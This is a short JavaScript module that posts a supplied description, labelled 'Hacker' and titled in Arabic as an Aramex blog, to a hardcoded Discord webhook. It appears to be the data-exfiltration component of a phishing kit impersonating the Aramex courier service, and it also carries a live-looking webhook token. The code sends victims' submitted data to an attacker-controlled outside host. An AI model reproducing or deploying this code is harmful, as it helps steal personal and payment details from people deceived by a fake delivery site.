import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322340415935877250/ASGpdQXRpV0lTqB0lJynSvUPSnXDhS04k9wivQMZowwGoknIub4XA517xo4qISfeGKcZ",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
